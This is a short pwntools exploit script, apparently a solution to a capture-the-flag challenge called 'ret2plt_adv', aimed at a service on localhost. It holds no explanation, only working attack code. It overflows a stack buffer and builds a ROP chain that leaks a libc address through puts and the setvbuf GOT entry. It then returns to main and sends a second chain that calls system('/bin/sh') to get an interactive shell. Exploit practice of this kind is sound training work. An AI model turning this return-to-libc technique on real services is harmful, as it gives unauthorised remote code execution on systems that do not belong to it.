from pwn import *

# r = process('../ret2plt_adv/share/ret2plt_adv')
r = remote('127.0.0.1',10008)
setvbuf_got = 0x404010
puts_plt = 0x0000000000401030
pop_rdi = 0x000000000040114a
main = 0x00000000040114f
payload = b'A' * (0x10 + 8) + p64(pop_rdi) + p64(setvbuf_got) + p64(puts_plt) + p64(main)
r.sendlineafter('Leave a message: ', payload)
libc = u64(r.recvuntil(b'\x7f').strip().ljust(8, b'\x00')) - 0x815f0
log.info('Libc: ' + hex(libc))
system = libc + 0x50d70
bin_sh = libc + 0x1d8678
ret = pop_rdi + 1
payload = b'A' * (0x10 + 8) + p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)
r.sendlineafter('Leave a message: ', payload)
r.interactive()
